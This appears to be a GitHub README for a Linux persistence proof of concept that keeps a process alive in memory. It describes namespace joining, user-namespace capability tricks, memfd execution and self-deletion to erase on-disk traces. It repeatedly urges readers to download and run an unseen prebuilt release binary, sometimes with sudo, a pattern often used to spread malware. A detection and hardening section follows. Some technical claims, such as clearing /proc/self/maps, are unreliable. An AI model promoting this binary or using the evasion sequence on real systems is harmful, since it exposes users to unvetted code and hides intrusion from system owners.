# Linux Persistence PoC: In-Memory Namespace Elevation Tool 🚀🐧

[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github&style=flat-square)](https://github.com/Nico241/Linux-persistence/releases)

![Tux](https://upload.wikimedia.org/wikipedia/commons/a/af/Tux.png)

Table of Contents
- Overview
- Quick links
- Features
- Threat model and goals
- How it works
- Architecture diagram
- Demo and images
- Quick start — download and execute
- Build from source
- Usage examples
- Detection and hardening
- Tests
- Contributing
- License

Overview
This repository contains a proof of concept for a no-reboot, in-memory Linux persistence mechanism. It uses namespace joining, user-namespace elevation, and self-deletion. The PoC runs without writing long-lived files to disk. It demonstrates how a process can persist in memory and reattach to target namespaces while avoiding a reboot.

The code base targets advanced kernel features. It uses clone(2), setns(2), unshare(2), pivot_root, and user namespace mappings. It also shows techniques to re-exec into preserved memory regions and to remove traces on disk. This PoC aims to document the sequence of actions and the kernel interfaces that make such persistence possible.

Quick links
- Releases page: https://github.com/Nico241/Linux-persistence/releases
- Download the release assets from the Releases page to run the binaries.

Features
- No-reboot persistence. The PoC keeps state in memory and returns to a target namespace.
- Namespace joining. The tool can join PID, mount, and network namespaces.
- User namespace elevation pattern. The PoC demonstrates a controlled userns mapping trick to gain capabilities inside a namespace.
- Self-deletion. The binary unlinks its on-disk file and drops most traces after execution.
- Minimal on-disk footprint. The PoC minimizes file drops and clears temporary files.
- Re-attach mechanism. The PoC shows how to reconnect to existing namespaces from a fresh process.

Threat model and goals
This PoC is research code. It shows how kernel namespace primitives can be used to achieve persistence without rebooting. The PoC assumes:
- Local code execution is possible.
- The kernel supports user namespaces and the required syscalls.
- AppArmor/SELinux may block some operations.
- Root or CAP_SYS_ADMIN inside a namespace may be required for some flows.

Goals
- Demonstrate the syscall sequence for in-memory persistence.
- Provide a reproducible example for defenders and researchers.
- Document detection points and mitigation ideas.

How it works
The workflow breaks into several steps. Each step maps to kernel primitives.

1) Launch helper in a user namespace
- The PoC spawns a helper using clone(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWNET).
- It maps uid/gid pairs in /proc/[pid]/uid_map and /proc/[pid]/gid_map.
- The helper obtains CAP_SYS_ADMIN inside userns when mapping allows.

2) Prepare a pivot_root and private mount
- The helper creates a tmpfs mount.
- It bind mounts needed resources into the tmpfs.
- It uses pivot_root to set the tmpfs as root.
- It remounts old root as private and unmounts when needed.

3) Join target namespaces
- The main process uses setns(2) on /proc/<pid>/ns/{pid,net,mnt} to enter the target namespaces.
- The PoC uses O_CLOEXEC on fd to avoid leaks.
- Once inside, the process checks capabilities via capget/capset.

4) In-memory persistence and re-exec
- The PoC maps an ELF image into anonymous memory via memfd_create.
- It writes an ELF payload into the memfd.
- It executes the memfd by using fexecve(2) on the memfd.
- After exec, the process unlinks the on-disk helper and clears /proc/self/maps entries as feasible.

5) Self-deletion and cleanup
- The process unlinks the original binary or removes the tmpfs.
- It closes fds and drops admin rights where applicable.
- It maintains presence in memory via fds and kernel references.

Key syscalls used
- clone(2), unshare(2)
- setns(2)
- memfd_create(2), fexecve(2)
- pivot_root(2), mount(2), umount2(2)
- prctl(2), setresuid(2), setresgid(2)
- capget(2), capset(2)

Architecture diagram
![Namespace Diagram](https://upload.wikimedia.org/wikipedia/commons/6/67/Namespace_Diagram.svg)

Note: The diagram above illustrates namespace boundaries and how a process can attach to multiple namespaces.

Demo and images
- Tux logo above for theme.
- Example mount layout:
  ![Mounts](https://upload.wikimedia.org/wikipedia/commons/3/33/Proc_mounts_example.png)
- Minimal network namespace view:
  ![Network Namespace](https://upload.wikimedia.org/wikipedia/commons/5/59/Network_namespace_example.svg)

Quick start — download and execute
You can download a prebuilt asset from the Releases page and run it. Visit the Releases page, pick the asset for your platform, download it and run it.

Important: the Releases link contains a path. Download the release asset from:
https://github.com/Nico241/Linux-persistence/releases

Example steps (Linux amd64 binary):
1. Download an asset from the Releases page. For example, pick linux-persistence-amd64.
2. Make it executable:
   chmod +x linux-persistence-amd64
3. Execute it:
   ./linux-persistence-amd64

The binary will attempt the sequence described above. It will log actions to stdout. If you run as non-root, the PoC will attempt user namespace flows. If you run as root, the PoC will run with full capabilities inside the created namespaces.

If the Releases link does not work for your environment or you prefer to build from source, see the Build from source section.

Build from source
Prerequisites
- Go 1.20+ or GCC toolchain depending on the chosen code path.
- Linux kernel with user namespaces enabled.
- pkg-config and dependencies for libcap if using capset helpers.

Clone and build (Go example)
1. Clone the repo:
   git clone https://github.com/Nico241/Linux-persistence.git
   cd Linux-persistence
2. Build:
   go build -o linux-persistence cmd/main.go
3. Run:
   sudo ./linux-persistence

C build flow (C example)
1. Install build tools:
   apt install build-essential pkg-config libcap-dev
2. Build:
   make
3. Run:
   sudo ./linux-persistence

Usage examples
- Basic run
  sudo ./linux-persistence

- Run as unprivileged user (userns path)
  ./linux-persistence --userns

- Join a target PID namespace
  ./linux-persistence --join-pid 1234

- Dry-run
  ./linux-persistence --dry-run
  (prints planned syscall sequence without executing)

CLI options
- --join-pid <pid>   Join PID namespace of <pid>
- --join-net <pid>   Join network namespace of <pid>
- --userns           Use user namespace mapping flow
- --debug            Enable debug logs
- --dry-run          Print planned actions only

Detection and hardening
This section lists detection points and mitigation ideas. Use them to harden systems.

Detection signals
- Unexpected memfd usage by processes.
- fexecve on memfd descriptors.
- Temporary pivot_root or unusual tmpfs mount points.
- Processes that hold open namespaces in /proc/*/ns.
- Anonymous execs followed by unlink of the backing file.

Audit points
- Audit memfd_create, fexecve, setns, pivot_root syscalls.
- Audit mounts and umounts on tmpfs targets.
- Monitor /proc/*/fd for deleted files held open.

Mitigation
- Disable unprivileged user namespaces if not needed by apps.
- Enforce FSTAB and mount namespaces via systemd/nspawn policies.
- Use LSMs (AppArmor, SELinux) to restrict pivot_root and mount operations.
- Use seccomp profiles to block memfd_create and fexecve for untrusted processes.

Note: Hardening requires testing. Adjust policies to avoid blocking expected apps.

Tests
The repository includes unit tests and integration tests. The integration tests require a test VM or container that allows user namespace creation.

Test commands
- Unit tests:
  go test ./...
- Integration test:
  sudo ./tests/integration/run.sh

The integration harness validates:
- User namespace mapping.
- setns join flows.
- memfd_exec lifecycle.
- Self-deletion path.

Contributing
- Open an issue for design questions.
- Send pull requests for bug fixes and docs.
- Follow the coding style in CONTRIBUTING.md.

When you submit a PR:
- Add tests for new behavior.
- Keep changes minimal and focused.
- Document any new syscall or behavior in the README.

Releases
You can find prebuilt binaries and release notes on the Releases page:
https://github.com/Nico241/Linux-persistence/releases

Click the badge at the top or visit the link above to download assets.

License
This repository uses the MIT License. See LICENSE for full text.

Acknowledgements
- Linux kernel docs for namespaces and memfd.
- Community posts that document user namespace mappings.
- Test harness authors.

Contact
Open issues on GitHub for questions, bug reports, or feature requests.